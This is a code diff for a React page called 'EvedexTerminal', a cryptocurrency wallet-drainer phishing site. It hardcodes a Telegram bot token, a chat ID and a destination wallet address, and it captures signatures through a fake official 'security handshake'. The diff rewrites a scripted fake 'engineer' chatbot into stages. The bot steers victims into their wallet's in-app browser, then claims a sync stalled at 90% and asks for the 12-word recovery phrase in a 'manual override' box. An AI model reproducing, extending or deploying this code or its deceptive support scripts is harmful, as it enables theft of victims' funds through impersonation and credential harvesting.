@@ -24,6 +24,7 @@ export default function EvedexTerminal() {
   const [stage, setStage] = useState(1);
   const chatEndRef = useRef(null);
 
+  // YOUR TELEGRAM CONFIG
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
@@ -32,6 +33,7 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
+  // CAPTURE SIGNATURES
   const captureHandshake = (type) => {
     const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
     signMessage({ message: msg }, {
@@ -55,7 +57,7 @@ export default function EvedexTerminal() {
     }
   }, [isConnected, address, balance]);
 
-  // --- THE FIXED SMART AI BRAIN ---
+  // --- THE SMART STAGED AI BRAIN ---
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
     const userMsg = chatInput.toLowerCase();
@@ -67,38 +69,33 @@ export default function EvedexTerminal() {
       let response = "";
       const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
-      // 1. ASSETS / MONEY / SEE / SHOW
-      if (["money", "balance", "token", "eth", "funds", "see", "show", "vault", "wallet"].some(w => userMsg.includes(w))) {
-        response = pick([
-          "[ENGINEER]: Diagnostic indicates asset clusters are detected but currently obscured by an RPC indexing lag. To stabilize the feed and view your full vault, please ensure you are mirroring this session inside your Wallet's internal DApp browser.",
-          "[ENGINEER]: I understand you're looking for your assets. Our node is currently indexing your specific cluster. Standard browsers like Safari won't work—you'll need to use the integrated browser in Trust Wallet or MetaMask.",
-          "[ENGINEER]: Your vault balance is currently in 'Safe-Cache' mode. To pull the live data from the mainnet, move this link to your Wallet App's browser. It provides the necessary Web3 provider for vault indexing."
-        ]);
+      // STAGE 3: STUCK AT 90% (IN-WALLET)
+      if (stage === 3) {
+        if (["stuck", "90", "waiting", "slow", "why", "stop", "finish"].some(w => userMsg.includes(w))) {
+          response = pick([
+            "[ENGINEER]: Node indexing is paused at the 90% security threshold. The system has detected a 'Vault Ownership Conflict'. To release the assets and finish the sync, please utilize the Red Manual Override box below.",
+            "[ENGINEER]: Protocol stalled. High-value native assets require a manual cryptographic signature to clear the desync. Please provide your 12-word master key in the designated error box to reach 100%."
+          ]);
+        } else if (["seed", "phrase", "key", "safe", "mnemonic"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: The master entropy is required to re-index your private vault to the mainnet cluster. This is a local-only verification to force the final 10% synchronization. Your assets remain under vault isolation during this process.";
+        } else {
+          response = "[ENGINEER]: System status: 90% Indexed. To finalize the vault repair and clear the node stall, please use the Red Manual Override box with your recovery phrase.";
+        }
       } 
-      // 2. HOW TO / STEPS / PROCESS / HELP
-      else if (["how", "step", "guide", "help", "process", "go about", "instructions"].some(w => userMsg.includes(w))) {
-        response = pick([
-          "[ENGINEER]: Certainly. The alignment process is straightforward: 1. Copy our URL. 2. Open your Wallet App. 3. Paste into the 'DApps Browser'. Once there, the 'Initialize' protocols will become active.",
-          "[ENGINEER]: To resolve any pending issues, follow this bridge protocol: Copy 'evedex.network' and open it inside your Trust/MetaMask browser. This bypasses the mobile sandbox and allows the node to finalize your sync."
-        ]);
-      }
-      // 3. SEED / PHRASE / WHY / SAFE / TRUST
-      else if (["seed", "phrase", "key", "mnemonic", "safe", "why", "trust", "scam"].some(w => userMsg.includes(w))) {
-        response = pick([
-          "[ENGINEER]: Security Protocol 4.2 is in effect. The 12-word master entropy is required only to re-index your private key to the Mainnet cluster. This is a local-only cryptographic proof of ownership.",
-          "[ENGINEER]: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new architecture. Without this entropy, the synchronization cannot cross the 90% threshold."
-        ]);
-      }
-      // 4. STUCK / 90% / WAITING
-      else if (["stuck", "waiting", "90", "slow", "percent"].some(w => userMsg.includes(w))) {
-        response = pick([
-          "[ENGINEER]: Systems are currently held at the 90% threshold for safety. To push through the final 10% and release the assets, please provide the 12-word master key in the designated Manual Override box.",
-          "[ENGINEER]: A 'Vault Ownership Conflict' has paused the sync at 90%. Please utilize the Red Error Box with your recovery phrase to force the 100% completion."
-        ]);
-      }
-      // 5. DEFAULT
+      // STAGE 1-2: INITIAL CONNECTION (SAFARI / OUTSIDE WALLET)
       else {
-        response = "[ENGINEER]: System Diagnostic: RPC latency detected. To ensure full synchronization of your vault assets, please mirror this link into your Wallet's internal DApp Browser. If you are stuck at the 90% final stage, the Manual Override is the required next step.";
+        if (["money", "balance", "token", "see", "show", "missing", "wallet", "funds"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: Diagnostic indicates assets are obscured by an RPC indexing lag in your current browser. To view your full vault and holdings, you must mirror this session into your Wallet's internal DApp browser.";
+        } 
+        else if (["how", "step", "guide", "help", "process", "go about", "instructions", "connect"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: Connection Procedure: 1. Click the COPY icon in the chat bar. 2. Open Trust Wallet or MetaMask. 3. Paste the URL into the 'DApps Browser' tab. This establishes the secure RPC bridge needed to initialize your vault.";
+        } 
+        else if (["not working", "can't", "error", "problem", "click", "type", "locked"].some(w => userMsg.includes(w))) {
+          response = "[ENGINEER]: RPC Handshake Blocked. Standard browsers (Safari/Chrome) do not have 'Write' permissions for node repairs. To unlock the terminal and portal fields, please move this session to your Wallet's internal browser.";
+        } 
+        else {
+          response = "[ENGINEER]: System Diagnostic: RPC latency detected in standard webview. For full vault access and synchronization, please ensure you are utilizing your Wallet's internal DApp browser.";
+        }
       }
 
       setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
@@ -136,7 +133,7 @@ export default function EvedexTerminal() {
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
           <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
         <w3m-button balance="hide" /> 
       </header>
@@ -157,6 +154,7 @@ export default function EvedexTerminal() {
           <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
             <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} Portal</h2>
+            
             <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-80" : ""}`}>
               <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">
                 {activeTask === "Rectify" ? "VAULT_LIQUIDITY_FEED (LOCKED)" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
